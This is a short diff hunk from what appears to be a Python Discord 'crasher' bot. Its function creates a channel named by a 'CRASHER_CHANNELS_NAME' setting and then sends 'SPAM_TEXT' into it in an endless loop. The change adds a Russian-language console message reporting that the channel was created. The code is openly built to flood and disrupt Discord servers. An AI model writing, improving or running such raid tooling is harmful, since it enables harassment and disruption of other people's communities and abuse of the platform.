@@ -114,6 +114,7 @@ async def createroles(ctx):
 async def NEW_CHANNEL(ctx):
     try:
         c = await ctx.guild.create_text_channel(data['CRASHER_CHANNELS_NAME'])
+        print(Fore.GREEN + 'СОЗДАН КАНАЛ')
         while True:
             await c.send(data['SPAM_TEXT'])
     except:
